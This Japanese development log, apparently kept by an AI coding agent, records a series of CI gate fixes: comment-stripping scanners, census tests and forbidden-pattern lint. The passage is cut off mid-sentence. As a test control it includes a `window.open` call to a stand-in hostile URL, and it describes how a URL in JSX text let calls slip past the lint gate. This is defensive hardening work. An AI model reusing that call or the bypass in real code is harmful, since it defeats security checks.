★ **いちばん重いのは秘書室で、そこには「決めない」と書いてあった** —— 注記が「秘書室を必須にはしない … **0 室になったら CI の出力でそう分かる**」と述べていた。**緑のゲートの成功行は誰も読まない**ので、出力に出すことは検査することではない (法則 `no-weakness-as-spec` の、保留をゲートに書き残した形)。しかも「どちらが意図かコードからは決まらない」も偽で、**冒頭の不変条件 9b と `--plan` の組織図がどちらも「常設」と述べていた** —— 決まっていなかったのではなく、囲いだけがそれを読んでいなかった。**直し**: 母集団の床 `checkPopulations` (6 種) ・秘書室の完全性検査の囲いを外す・`--self-test` (**10 件**)・外側の証人 `orchestrationPopulationFloors.test.ts` (**6 件**)。**実物の registry は 1 つも動かない** (今日 5 室 / 5 役員)。★ **対照 12 方向すべて鳴り、それぞれ狙った層に当たる** (A 読めない=空へ戻す · 忠実な形 self-test ✗1 + 証人 ❌2 + **実物 exit 0 (欠陥の再現)** / A' 同 · `{}` 形 ✗1 + ❌1 (鳴るが理由が違う) / B 配列の検査を外す ❌1 / C 消費者を空の Set へ ❌1 / D 床を 0 へ ✗2 + ❌1 · 1 へ ✗1 + ❌1 / E 空の台帳にも床 (過剰) ✗4 + ❌1 / F 実物を壊す **exit 1** / G 床を空に戻す ✗8 + ❌1 + **実物 exit 0** / H 秘書室を囲み直す ❌1 / I backlog にも床 (過剰) ✗10 + ❌1 / J 床を `main` から外す ❌1 + **実物 exit 0**)。★★ **自戒 4 つ —— 3 つは「鳴らない対照」だった**: ① **A が 1 度目に鳴らなかった** —— 私の 9 件は `evaluate` に手で組んだ値を渡すので、**`readLedger` の中を戻しても誰も見ていない**。実ファイルで往復させる形を両層に足した ② **J も鳴らなかった** —— 床の**中身**は借りて見ているのに**呼ばれているか**を誰も見ていない。門を丸ごと走らせる継ぎ目 (`--registry <path>`) を開けて閉じた ③ **D も鳴らなかった** —— 床の値を読んで主張すると、下げれば主張ごと下がる。値に依らない側 (`corpusTooSmall(0) === true`) を留めた。**鳴らない対照は合格ではなく、その検査についての報せ** ④ **私の証人が自分の docblock に当たった** (直す前の形を引用したため · 法則 `mention-vs-declaration`) —— 共有の `stripComments` を通し、**針が当たる標本**と**注記の中では当たらない標本**を添えた (パス 464 / 465 / 466 と同じ家系で 5 度目)。★ **法則は増やさない** —— これは `count-has-floor` (「『Checked 0 … ✅』は走査が壊れても緑」) の当の現れなので、その法則に**3 つの軸** (読めない ≠ 空 / 正当に 0 になる母集団には床を置かない / 床は床の値で主張しない) と執行者 4 つを足した。★ **ゲートが 4 つ捕まえた —— どれも設計どおり**: ① `ontologyLaws` の「self-test を持たないゲート」の台帳が 6 → **4** (2 本とも外れた。旧い理由「実物へ違反を植えて鳴ることを確かめた」が**母集団が非空のときの対照**にすぎなかったことも書き足した) ② `commentStripperCensus` の「寄せた本の一覧」が 84 → **85** ③ `verify:arch` の live metric 3 件 (ユニットテスト数 15915 → **15933**・陰性対照つきゲート 32 → **34**・`file:line` 参照 649 → **650** —— **今回も予想せず門に訊いた**) ④ `eslint` の `preserve-caught-error` (私の `throw new Error(...)` に `cause` が無かった)。★ **測って何も無かった軸も記録する**: ① **`teams: []` は既に鳴る** (5,780 件) が、それは round と管理職の参照が外れる**副作用**であって床としてではない —— 床を足して局所化した ② **`backlog` には床を置かない** (着手候補が片付けば 0 になりうる。**確かめる物が無いことと、検査が消えたことは別である**) ③ **`lint:doi-prefix` は同じ免除の理由を共有していたが、床を持っていた** —— この記述は 1 度「空にする側は測っていない」と書きかけたが、**測ったら床が 3 つ在った** (`MIN_ISBN_CHECKED` 100 / `MIN_ISSN_CHECKED` 300 / 出版社ラベルの経路 300) で、docblock も「0 件でも ✅ になる状態を塞ぐ (2026-08-22)」と述べ**抽出経路ごとに床が要る**ことを対照実験で確かめた記録まで持っていた (実測: `PUBLISHERS` を空にすると `❌ … 0 件しか拾えませんでした (300 件以上を期待)` · exit 1)。★ **つまり同じ理由で免除されていた 3 本のうち床を持っていたのは 1 本だけ**で、免除の理由は**覆われているように見せる**方向に働いていた (法則 `measure-before-claim`)。`typecheck` 緑・`npm test` **903 / 19,128**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-25 パス 466 後も 11,971,801 B / 3,384,320 B で byte 単位で不変 (md5 も同一)** (直したのは `scripts/` 2 本と `__tests__/` 2 本・`ontology/`・`docs/` だけ —— **出荷コードは 1 行も動いていない**。それでも**両方を組んで md5 まで見た** (`fef32c62…` / `5e00fcdf…`)。**CI の門の免除の枠に、散文が入っていた。** **見つけ方**: パス 465 の道具は **`npm test` しか覆っていなかった** —— **`verify:all` の 37 ゲートは 1 度も注記を無意味にして走らせていない**。ゲートは CI の執行層 (落ちれば push できない) なので、答えが散文に依っているなら検査より重い。`--gates` を足して測った (**1 本ずつ**走らせる —— `verify:all` は `&&` なので先頭が落ちると 3 番目から先が 1 度も走らない)。実測 (2026-09-25 · 実物の木で 1,380 本を書き換え):

| 測った物 | 実測 |
| --- | --- |
| 素の木 | **37 / 37 が exit 0** |
| 注記を無意味にした木 | **落ちるのは 5 / 37** |

★ **そのうち 1 つが本物だった** —— `lint:forbidden` の免除の台帳の鍵は `規則 :: ファイル :: 件数` で、件数はパス 273 が「ファイル名だけだと**新しい違反を足しても鳴らない**」として足した物である。ところが **`codeOnly` でない規則 (実測 38 中 14) は注記の中でも鳴る** —— それは測って決めた方針で (パス 370: 「注記の中でも鳴るのは正しい —— 走査は綴りしか見ないので、例外を作るとそこが穴になる」)、**問題は枠のほうだった**: 件数が 1 つの数なので**散文が枠を食う**。実測: **53 行のうち 5 行 (3 規則)** が一部/全部を散文で埋めており、**3 行は全額**。★ **決定的な対照** (2026-09-25 · `src/main/clients/ollama.ts` の免除は `:: 2` で、その 2 件は**どちらも注記**):

| 対照 | `lint:forbidden` |
| --- | --- |
| 注記の綴りを消す (コードは 0 件) | **❌ 台帳に在るのに効いていない** |
| 注記を残して本物の fetch を 2 本足す | **❌ 台帳に無い例外 (`:: 4`)** |
| **注記の綴りを消し、同じ数だけ本物の fetch を足す** | **✅ no forbidden patterns found (例外 53 件はすべて台帳どおり)** |

つまり **CVE-2024-37032 (Probllama) ほかが実装される当の書き込み口が、CI の門を黙って通った。** 呼ぶ側の実害は今日 0 (その口への呼び出しは実在しない) —— 開いていたのは**門のほう**である。★ **直しは 1 条件** —— 散文が枠を食っている行だけ **code の件数も名乗る** (`:: 2 (code 0)`)。**48 / 53 行は今までどおり**で、`codeOnly` の規則は元から注記を見ないので付かない。**注記の中でも鳴らすのをやめるのではない** (やめると規約が注記に逃げられる)。★ **機械は 3 層** —— ゲートの self-test に**免除の枠の 7 件** (散文が一部/全部を食う形・`codeOnly` は付かない・**散文 2 件とコード 2 件は別の鍵**・**実物の main の Ollama が `:: 2 (code 0)` であること**)、`forbiddenPatternWitness.test.ts` に**外側の証人 4 件** (実物の原文から綴りを消して同じ数の本物の呼び出しを足し、**鍵が動くこと**と**台帳に無い鍵になること**を見る。★ 台帳の綴りに依らない主張も入れた —— 台帳だけを見ると「門を戻したのに台帳が新しいまま」のとき緑になる)、`commentBlindLedger.test.ts` に**ゲートの台帳 6 件** (母集団を `package.json` の `verify:all` から導いて双方向・`kind` は docblock が説明済みの 5 語・**まとめて走らせていないこと**)。★ **対照 4 方向すべて鳴り、それぞれ狙った層に当たる** (A 門を件数だけの鍵へ戻す ❌2 + self-test ✗4 (**決定的な検査も鳴る**) / B 門と台帳の両方を戻す = 直す前の姿 ❌2 / C ゲートの台帳から 1 行消す ❌2 / D 実在しないゲートを台帳へ ❌1 + self-test ✗1)。★ **ゲートが私の docblock を捕まえた —— 設計どおりで 4 度目** (パス 464 / 465 と同じ家系): 道具の説明文に書き込み口の綴りをそのまま書いたので `lint:forbidden` が鳴った。綴りを再現せずに述べる形へ直した (**証人の側は最初から**綴りを実行時に組み立てている —— この検査ファイル自身が走査対象だから)。★ **測って何も無かった軸も記録する**: ① **落ちた 5 本のうち 4 本は設計どおり** —— `verify:arch` は live metric が `lint:forbidden` を子プロセスで走らせるので**そちらの結果を継ぐ** (自分の記号の窓は パス 292 / 463 から `stripComments` を通る)・`lint:mutation-scope` は**理由の書かれていない pragma を落とす門**なので理由 (= 注記) を消せば当然鳴る・`lint:shared-judgement` は**自分の self-test の標本**が注記の中の否定を数える (実測「原文 6 件 → 2 件」が「2 件 → 2 件」になる)・`chain:verify` は注記と無関係で byte が動くから必ず落ちる ② **終了コードは動かないが文面だけ動くゲートが 4 本** —— `lint:regex` (所要時間 1253ms → 1250ms)・`lint:citations` (Node の循環依存の警告に載る PID だけ)・`lint:repo-size` (日本語が 1 字 1 byte になるので byte 数が縮む)・**`lint:storage` (`36 保存箇所` → `35`)**。最後のは注記の中の 1 件 (`data/chatbotOllama.ts` の docblock がパス 449 で直す前の式を引用している) で、**床は 20 なので拘束しておらず、台帳は双方向のまま通る** (実測)。この走査が散文で満たされうる向きは「消えた保存先の台帳の行が残る」= **過剰申告**で、「実在する保存先を見落とす」側ではない ③ **eslint は落ちない** (注記の中身は規則の対象ではない)。`typecheck` 緑・`npm test` **901 / 19,110**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15905 → **15915** へ —— **今回も予想せず門に訊いた**)・`chain:verify` 緑 (保護対象は 1 つも触っていない)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-25 パス 465 後も 11,971,801 B / 3,384,320 B で byte 単位で不変 (md5 も同一)** (直したのは `scripts/` 3 本と `__tests__/` 6 本・`ontology/`・`package.json`・`docs/` だけ —— **出荷コードは 1 行も動いていない**。それでも**両方を組んで md5 まで見た** (`fef32c62…` / `5e00fcdf…`)。**「この検査は注記に騙されているか」は綴りに現れない —— 散文が答えになっていた census が 2 本。** **見つけ方**: パス 464 が `.tsx` の変換が壊れて止めた実験を `.tsx` を除いて完走させ、**道具にした** (`npm run audit:comment-blind` —— 定期点検の道具 7 本目)。★ **なぜ振る舞いで測るしかないか** —— このリポジトリの検査は**原文を読んで**母集団や台帳を導く物が多い (実測: `readFileSync` / `readOriginalSource` を読む検査 228 本のうち、注記を落とすのは 106 本)。原文には注記も入るので、「宣言が在る」と主張しているつもりで**散文が在るだけ**という形が生まれうる (法則 `mention-vs-declaration`)。それは**綴りに現れない** —— 検査のソースを何度読んでも書いていない。実測 (2026-09-25 · 隔離した写しの上で): 走査した本 **1,428**・本文を無意味にした注記 **31,598**・残した注記 (pragma と JSDoc のタグ) 1,061・**自己検査の失敗 0**・**行数が変わった本 0** (`added=81717 / deleted=81717` —— だから `verify:arch` の `file:line` 参照は動かない)・落ちた検査 **13 ファイル / 15 件**。★ **仕分けると 11 本は設計どおり** (標本が注記の中に在る 4 本・docblock の断定を留める 4 本・注記そのものを数える 1 本・母集団が散文を含む設計 2 本・内容ハッシュ 1 本 —— 最後のは注記と無関係で、保護対象の byte が動くから必ず落ちる) で、**2 本が「散文が答えになっていた」**:

| 検査 | 散文で満たされていた物 |
| --- | --- |
| **`lawCoverageLedger`** | `shell-open-gate` が「母集団を走査する検査を持つ」—— 根拠は `exportSymlinkContainment.test.ts:49` の**注記 1 行** (`readOriginalSource` の綴り) で、しかもその注記は「一時の道に使うと的が外れる」と**使っていないこと**を述べていた |
| **`limitCoverageCensus`** | `MAX_STOCK_ADVISOR_RISK_CHARS` (LLM の応答 1 件あたり 200 字の天井・**両ビルドの出荷コードが読む**) が「検査から名前で参照されている」—— 根拠は `ceilingLiteralCensus.test.ts` の docblock の**例示 1 行**で、その文は「同じ数だが別物」と述べていた |

★ **向きが重い** —— どちらも「穴を数えるために在る台帳」が、その穴について黙っていた。`shell-open-gate` は **OS に開かせてよいファイルを決める境界**で、「**新しい呼び出しが関門を飛ばした**ときに鳴る物」が 1 つも無かった。**直し**: ① どちらの census も原文を `stripComments` に通す ② `shell-open-gate` に**本物の母集団の走査**を書く (`shellOpenCallSites.test.ts` **5 件** —— `shell.openPath` / `shell.showItemInFolder` の呼び出しを `src/main` の全件から拾い、渡すのが**識別子**であること・その識別子が `shellTargetOrNull` の**戻り値**であること・`=== null` の門を通っていることを 1 件ずつ要求する。実測 2 か所。**`shell.openExternal` は母集団に混ぜない** —— あちらは URL の境界で関門も別) ③ 200 字の天井は**振る舞いでは守られていた**が、両ビルドの検査が**数字を題名と正規表現に書き写して**いたので定数を読む形へ (境界ちょうどが通ることも足した)。★ **道具は常設にした** —— ソースを書き換えるので CI では走らせず (`audit:tick-sensitivity` と同じ判断)、`finally` で必ず戻して**内容で照合**し、落ちた検査を理由つきの台帳と**双方向**に突き合わせる。走査器は**共有の 1 つ** (`scripts/lib/strip-non-code.cjs` に `commentSpans` を足した —— 範囲を採るために 2 つ目の字句解析器を書くと「同じ算法の 5 つ目の綴り」になる · パス 461 / 463)。台帳の**形**は `commentBlindLedger.test.ts` (**10 件**) が毎回の `npm test` で見る。★ **対照 10 方向すべて鳴り、それぞれ狙った層に当たる** (A census を生の原文へ ❌1 / B 法則の走査を生の原文へ ❌1 / C `openPath` の null の門を外す ❌1 / D `showItemInFolder` に生のパス ❌1 / E 台帳から 1 行消す ❌1 / F 道具を `verify:all` へ混ぜる ❌1 / G 道具が自前の走査器を持つ ❌1 / H 自己検査を後ろへ ❌1 / I 検査を 200 の写しへ戻す ❌1 / J 法則から新しい走査を外す ❌1・復帰後すべて緑)。★★ **自戒 4 つ** —— ① **対照 A / B は 1 度目に鳴らなかった**: どちらも直しの一部で「別の道」が生えたので、生の原文へ戻しても通る。**鳴らない対照は合格ではなく、その検査についての報せ**なので、「注記の中にしか無い言及」そのものを木から採って標本に留めた ② **その標本も 1 度は漏斗を通していなかった** —— `stripComments` を直に呼ぶ標本は census を戻しても鳴らない。**標本は走査に掛ける物と同じ口を通す** (パス 458 の自戒と同じ形) ③ **私の台帳の理由が別の census の母集団に入った** —— インボイスの経過措置の綴りを再現したため。パス 464 (CLAUDE.md の散文が針を横取り) / パス 456 (docblock が census に入る) と同じ形で **3 度目**で、綴りを再現せずに述べる形へ直した ④ **`pkill -f` が自分の shell を殺した** (コマンド行に同じ綴りが在るので自己一致・パス 456 と同じ罠の **2 度目**)。★ **ゲートが 3 つ捕まえた —— どれも設計どおり**: ① `lint:forbidden` が新しい道具の子プロセスを台帳の無い例外として鳴らした (理由つきで登録) ② `commentStripperCensus` の「寄せた本の一覧」が 80 → **84** (新しい 4 本が共有の `stripComments` を読む) ③ `absenceSampleCensus` の**行番号の台帳** 4 行が、私の編集で行がずれて母集団から消えた (実測へ更新)。★★ **そして道具が、私の未検証の主張を捕まえた** —— commit の文面で「直した 2 本は台帳から抜ける」と書いたが、**予測であって測っていなかった**。実物で走らせると **1,431 本 / 落ちるのは 14 本**で、`lawCoverageLedger` と `limitCoverageCensus` は**抜けなかった** —— 直しの一部として「注記の中にしか無い言及」そのものを木から採って標本に留めたので、**今度は意図して注記を読む** (`sample-in-comment`)。私の新しい `commentBlindLedger` も同じ理由で落ちる (道具の docblock を読む)。3 本を理由つきで台帳へ入れ、検査の側の「抜けたか」の主張を「**直った上で正しい種類で載っているか**」へ直した (法則 `measure-before-claim`)。★ **見えるのは片側だけ (正直に書く)** —— 「注記のおかげで通っていた検査」は落ちるが、「不在を主張していて注記のせいで偽に近かった検査」は**逆に通ってしまう**ので映らない (そちらの母集団は `absenceSampleCensus.test.ts` が別に持つ)。`typecheck` 緑・`npm test` **901 / 19,100**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15886 → **15905** へ —— **今回も予想せず門に訊いた**)・`chain:verify` 緑 (block 259・保護対象 92 は 1 つも触っていない)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-25 パス 464 後も 11,971,801 B / 3,384,320 B で byte 単位で不変 (md5 も同一)** (直したのは `__tests__/` 2 本と `scripts/lib/` 1 本・`ontology/`・`docs/` だけ —— **出荷コードから `__tests__` への import は実測 0 件**。それでも**両方を組んで md5 まで見た**。**`.tsx` は JS ではない —— JSX テキストの URL 1 つで禁止規則を迂回できた。** **見つけ方**: パス 463 が残した問い (「綴りの針を足すたびに次の綴りが隠れるので、母集団を**振る舞いで**数える」) を測りに行った。**題は母集団の作り方だが、測ったら本体は走査器の言語だった。** 隔離した写しの上で `src` + `scripts` の **1,464 本**の注記の**中身だけ**を無意味にし (長さと改行は保つ)、`stripComments(書き換え後) === stripComments(原文)` を自己検査にして「触ったのは注記だけ」を証明してから全件を走らせたら、**`.tsx` の変換が壊れ、その壊れた理由が欠陥そのものだった** —— `<code>http://127.0.0.1:11434</code>` の `//` を行注記として読み、`</code>` ごと飲んでいた。★ **共有の走査器は JS の字句解析器で、JSX の素のテキストは JS ではない。** パス 461 は同じ原理を CSS について書いていた (「言語が違う物に同じ道具を当てない」) が、**`.tsx` は測られていなかった** —— そして `.tsx` はこのアプリの UI そのものである。実測 (2026-09-25 · 実物のゲートを `A8netPage.tsx` に当てる):

| 対照 | 置いた行 | `lint:forbidden` |
| --- | --- | --- |
| C | 素の行に `void window.open('https://evil.example')` | **❌ 1 件** |
| D | **同じ行の JSX テキストに URL を 1 つ足す** | **✅ 0 件 (見落とし)** |

つまり CLAUDE.md の規約 (外部 URL は `serviceHub.openExternal` 経由に統一する) が、**URL を 1 つ書くだけで迂回できた**。★ **向きが重い** —— 走査器が言語を取り違えると偽陽性 (見過ぎ) ではなく**偽陰性 (門が黙る)** になる。直す前の出荷 `.tsx` で行ごとの走査が URL の所で切れていたのは **8 行** (うち 7 行は JSX テキスト)。数は小さいが機構は無制限で、このアプリは画面に URL を出すので**行を 1 つ書くたびに死角が増えうる**。★ **直しは 1 条件** (`://` は行注記を始めない) で、**両方の実装**に入れた (パリティ検査が縛るので片方だけは不可)。実測の影響は **1,537 本のうち 3 本 (すべて `.tsx`)** だけで、`.ts` / `.cjs` は 1 字も動かない。**失敗の向きは「code を多く見る」側**へ倒してある。★ **機械は 2 層** —— `stripNonCodeParity.test.ts` (33 → **40 件**) が標本 3 つと「両モード・すべての写しで URL の後ろが残る」「本物の行注記は今までどおり落ちる」「読み違えの向き」を、`forbiddenPatternWitness.test.ts` (56 → **59 件**) が**ゲート本体で**対照 C / D を留める (行ごとの `hitsCodeOnly` と、ファイル 1 枚の `scanText` の両方)。★ **対照 3 方向すべて鳴り、それぞれ狙った層に当たる** (A `.cjs` だけ戻す ❌5 (パリティの食い違いも鳴る) / B `.ts` だけ戻す ❌3 / **C 両方戻す ❌4** —— 失敗の文が「URL を 1 つ足しただけで見落としている: expected +0 to be 1」と「expected [] to include 'window.open'」で**欠陥をそのまま名指しする**)・復帰後 **99 / 99**。★ **`verify:all` は exit 0** —— **見えるようになった 3 本の `.tsx` で、どのゲートも新しい違反を見つけなかった**。今日の実害は「門が迂回できた」ことだけで、迂回された実物は無い。★★ **そして私の記録が 2 つ目を見つけた** —— CLAUDE.md にこのパスの説明を書いたら `npm test` が 1 件落ちた: `bridgeStatic.test.ts` の「CLAUDE.md の列挙は橋の実物と両方向に一致する」が `expected [ 'openExternal' ] to deeply equal [ …15 件 ]`。針は `exec` の**最初の一致**を列挙として使っており、**散文が橋の口を 1 つ引用すればその言及が列挙より前に来て針が横取りされる**。パス 338 が「閉じた列挙も機械で結ぶ」として置いた当の検査が、**言及と列挙を構造で見分けていなかった** (同じ法則の 3 つ目の現れ)。直し: 列挙であることは散文の言い回しではなく**形**で決める (`/` 区切りの名前が 10 以上並ぶ一致はただ 1 つ) + 「言及も拾えている」床 + 言及 1 件が列挙として選ばれないことの標本。**対照 E** (最初の一致へ戻す) は ❌1 で今日の失敗をそのまま再現する。★ **法則は増やさない** —— これは `mention-vs-declaration` の**双対** (宣言が言及として分類された) なので、その法則に実測と執行者 2 本を足した。★ **測って何も無かった軸も記録する**: ① 「原文を読むのに注記を落とさない検査」は **166 本**在るが大半は正しい (JSON / Markdown / docblock を読む物・注記を*探す*物) ② `.tsx` で `stripComments` が食う 369 行は**すべて JSX 注記の本文**で欠陥ではなかった (私の最初の probe の偽陽性 · 法則 `measure-before-claim`) ③ **JSX はまだ解析しない** —— JSX テキストの `'` と `<code>/api/x</code>` は今も読み違えうるが、出荷 `src` の `.tsx` 108 本では実測 **0 行**。直すなら本当に JSX を解析することになり、読み違えれば*コードを飲む*側 —— 今より悪い向き —— へ倒れうるので、要る消費者が現れてからにする。`typecheck` 緑・`npm test` **899 / 19,081**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15880 → **15886** へ —— **今回も予想せず門に訊いた**)・`chain:verify` 緑。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-25 パス 463 後も 11,971,801 B / 3,384,320 B で byte 単位で不変 (md5 も同一)** (直したのは `__tests__/` 25 本と `scripts/` 8 本・`docs/` だけ —— **出荷コードから `__tests__` への import は実測 0 件**。それでも**両方を組んで md5 まで見た**。**注記を落とす同じ算法が、綴りを変えて 3 家系隠れていた。** **見つけ方**: パス 462 が残した問い (「自前の注記除去がまだ 22 本 —— 行単位の述語は契約が違う」) を 1 本ずつ組み替えた。**`REMAINING` は 0 件**になり、`.cjs` のゲート **9 本**が共有の `scripts/lib/strip-non-code.cjs` を読む (`stripComments` を `.cjs` 側へ移植し、パリティ検査が両モードを縛る)。★ **閉じる途中で、どの census の針にも映らない実装が出た** —— どれも同じ算法で、**綴りが違うだけ**である。パス 461 の docblock は「母集団は名前ではなく**算法**で数える」と書いたが、数えていたのは 3 つの**綴り**だった。実測 (2026-09-25):

| 家系 | なぜ見えなかったか | 実測 |
| --- | --- | --- |
| **行頭アンカーの正規表現** | `commentStripperCensus` の針は `startsWith('//')` ほか 3 綴りだけ | **12 本** —— 5 本はそれだけを持ち、**7 本はパス 462 が「寄せた」と記録した本に死んだ 2 つ目として残っていた** |
| **手書きの状態機械** (`scripts/shared-judgement-census.cjs`) | `stripNonCodeParity` の針は `function stripNonCode(` だけ | 共有の実装と **121 本 / 4,073 行**の食い違い |
| 同 (`src/shared/__tests__/markupExportCensus.test.ts`) | 同上 | **79 本 / 550 行** |

★ **後の 2 つは、パス 451 が `stripNonCode` で閉じた当の欠陥を生きたまま持っていた** —— 正規表現リテラルの扱いが無く、引用符を含む正規表現で**文字列モードへ入り、次の同じ引用符までを飲む**。飲まれた区間では**注記の本文が code として出る** (法則 `mention-vs-declaration`)。★ **正直に書く: 今日どのゲートの答えも変わらなかった** (`lint:shared-judgement` は 157 / 80 / 39 のまま)。母集団が動いたのは 1 つだけ —— **`lint:regex` の正規表現の母集団が 3,653 → 3,505 種** (**148 件は注記の中の式**で、1 度も走らない物を測っていた)。つまり大半は**罠の除去**である (パス 359 / 398 / 439 / 461 と同じ位置づけ)。★ **閉じ方**: `function stripComments(` の母集団を `stripNonCodeParity` へ足し、`stripComments` の答えも同じ標本で両実装を比べ、**`.cjs` の読み手を走査で導く** (手書きの 3 本を並べていた頃は 4 本目に気付けなかった)。★ **対照 8 方向すべて鳴る** (A 寄せた 1 本を述語へ戻す ❌2 / **B 3 つ目の実装を自前へ戻す ❌1** / C 共有の `.cjs` から `stripComments` を落とす ❌20 / **D census の針から regex 綴りを外す ❌1** (このパスの発見そのもの) / E 5 つ目を自前の宣言へ戻す ❌4 / F `MIGRATED` から 1 行消す ❌1 / G `.cjs` だけ正規表現の扱いを外す ❌4 / H ゲート 1 本が自分の写しを持つ ❌1・復帰後 **42 / 42**)。★★ **自戒: 対照 B は 1 度目 ❌0 だった** —— 3 つ目の実装を自前の状態機械へ戻しても誰も鳴らなかった。**「鳴らない対照は合格ではなく、その検査についての報せ」**の当のことで、それが上の「閉じ方」を決めた。★ **人工的な標本が 4 件落ちた** (パス 461 と同じ家系) —— どれも**裸の `*` 続き行**を注記として食わせる形で、実物の走査はファイル全体を渡すので**その形は 1 度も来ない**。走査に掛ける物と同じ形の標本 + **行末の注記**の標本へ直した。★ **`stripCommentsAndStrings` は寄せていない (理由を測った)** —— 共有の `stripNonCode` と **1,526 本 / 164,105 行**食い違うが、**それは契約の差**である (引用符を `""` へ正規化し正規表現の中身を `@` へ・module specifier の走査のため)。正規表現リテラルの扱いは在る (パス 296) ので今日の穴は無い。**契約を 1 つ増やすのは 2 人目の消費者が現れてから**にする。`typecheck` 緑・`npm test` **899 / 19,072**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15879 → **15880** へ —— **今回も予想せず門に訊いた**)・`chain:verify` 緑 (block 259・保護対象は 1 つも触っていない)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・2026-09-25 パス 462 後も 11,971,801 B / 3,384,320 B で byte 単位で不変** (触ったのは `__tests__/` 44 本と `docs/` だけ —— **出荷コードから `__tests__` への import は実測 0 件**なので入りえないが、それでも**両方を組んで測った**。**glob の `**` が偽の注記を開き、71 行を食っていた。** **見つけ方**: パス 461 が残した問い (`docs/REMAINING_WORK.md` の 1 件目 —— 「自前の注記除去がまだ 66 本」) のうち**ファイル全体を落とす 43 本**を共有の `stripComments` へ寄せた (66 → 22)。★ **パス 461 は「どの census の答えも変わらなかった」と書いたが、今回は 2 つ変わった。** 原因は**素朴なブロック注記の正規表現が、文字列の中の `/**` から始まること** —— このリポジトリの検査は glob を多用するので、`globSync(['src/main/**/*.ts'], …)` の `/**` がそこで「注記の始まり」になり、次のブロック注記の閉じまで丸ごと食う。実測 (2026-09-25 · 直す前):

| ファイル | 食われた範囲 | 台帳の件数 | 実測 |
| --- | --- | ---: | ---: |
| `stateWritePolicy.test.ts` | **68〜139 行 (71 行)** | 1 | **3** |
| `fileReadSizeGateCensus.test.ts` | **99〜144 行 (45 行)** | 6 | **9** |

★ **どちらも `originalSourcePolicy.test.ts` の台帳で、向きは両方** —— あの census は「mutate 台帳のファイルを原文で読む検査は `readOriginalSource` を通す」を見る物で、その台帳は自分で「**`count` は実測の件数で、増えたら鳴る (台帳が白紙委任にならないように)**」と述べている。`stateWritePolicy` は**一時ディレクトリの生の読み 2 件が載っていなかった**し、`fileReadSizeGateCensus` は逆に引用 3 件が見えていなかった。**どちらも「数が偽」で、偽にしていたのは道具である。** ★ **そして自己検査が偽だった** —— 「★ この検査自身は生の読みを 1 件も持たない (標本は綴りを割って組み立てている)」と主張しながら、台帳の `why` の散文 2 か所がその綴りを**割らずに引用**していた。旧い道具はそこも食っていたので通っていた。綴りを再現せずに述べる形へ直した (パス 372 と同じ手)。★ **母集団の実測** (`src` + `scripts` の 1,537 本): 素朴な正規表現が食うファイルは **42 本 / 合計 1,274 行**。最大は `shared-judgement-census.cjs` の 394 行。★ **免除を 1 つ足した** —— `themeTokens.test.ts` は落とす相手が **CSS** で、共有の字句解析器は JS/TS のもの。実測でこの CSS には注記の外の `//` が 0 件なので今日の答えは変わらないが、`url(//cdn…)` を 1 行書いた日に JS の行注記として行末まで食う。**言語が違う物に同じ道具を当てない。**★ **床を 2 つ実測から外した** —— 「見つけた件数 ≧ 40」は**減るのが正しい向き**の台帳に張り付いていたので、寄せた日に落ちた (パス 378 が `tickSensitivityLedger` で直した当の形)。床は**走査が木を歩いたこと**へ移し、針が生きていることは標本が直接見る。★ **対照 8 方向すべて鳴り、それぞれ狙った層に当たる** (A 寄せた 1 本を自前へ戻す ❌2 / B 台帳 3→1 ❌1 (**失敗の文が「台帳は 1 件だが実測 3 件」と名指しする**) / C 台帳 9→6 ❌1 / D 散文に綴りを割らずに戻す ❌2 / E 免除から外す ❌1 / **F 台帳から 1 行消す ❌1** / G 行の述語へ戻す ❌2 / H 走査を殺す ❌3・復帰後 **174 / 174**)。★★ **F は 1 度目に鳴らず、それが報せだった** —— `MIGRATED` は手書きの一覧で、行を消すとその行の主張 (「共有の道具を読む」「自前へ戻っていない」) が黙って消え、しかも自前を持たないファイルは `selfRolled()` にも出ないので**どちらの向きからも見えなかった**。**分類を下げるのも退行の 1 手**なので、`MIGRATED` を**走査から導く**形へ直した (パス 455 の対照 J と同じ形・直した後 F は ❌1 でファイル名を名指しする)。★ **自戒 2 つ**: ① **対照 H も 1 度目は当たっていなかった** —— `walk` の実物は引数が 2 つ (`rel, out = []`) で、私の置換が 1 度も起きていなかった。**「鳴らなかった」と「当てていなかった」は別である** (パス 397 / 399 / 403 / 420 / 421 に続く **6 度目**) ② **ゲートが私の散文を捕まえた** —— ブロック注記を閉じないために**ゼロ幅スペース (U+200B)** を 1 字挟んだら `lint:charset` が不可視文字として鳴らした。**設計どおり**で、綴りを再現せずに述べる形へ直した。★ **測って何も無かった軸も記録する**: ① **`fileReadSizeGateCensus` の 9 件はすべて文字列リテラルの中の引用**で、実際の生の読みは 0 件 (`stripNonCode` を当てると 0) —— ただしこの census は**道が読める読み**のために literal の中身が要るので `stripNonCode` へは移せない。台帳の理由 (パス 326) はそのまま真で、**数だけが偽だった** ② **`markdownExportCensus` の行の述語も寄せた** —— 行頭が `//` かで見ると**行末の注記が code として残る**ので、`stripComments` を通してから走らせる形へ (行番号は保たれる)。`typecheck` 緑・`npm test` **899 / 19,070**・`verify:all` exit 0 (`verify:arch` のユニットテスト数を 15878 → **15879** へ —— **今回も予想せず門に訊いた**)。**実機は回していない** —— 出荷物が 1 byte も動いていないので)・**2026-09-25 パス 461 後も 11,971,801 B / 3,384,320 B で byte 単位で不変** (変更は `__tests__/` と `docs/` だけ —— **出荷コードから `__tests__` への import は実測 0 件**なので、この変更は出荷物に入りえない。それでも**両方を組んで測った**。**注記を落とす道具の写しが 13 個あり、契約は 7 通りだった。** **見つけ方**: パス 460 が残した問い (`docs/REMAINING_WORK.md` の 2 件目 —— 「`codeOnly` の写し 10 個の契約が同じか測る」) をそのまま測りに行った。**題は「写し 10 個」だが、数えたら 13 個だった** (パス 460 の記録が `responseRowGuards` / `csvColumnCoverage` / `namedControlExists` の 3 本を落としていた · 法則 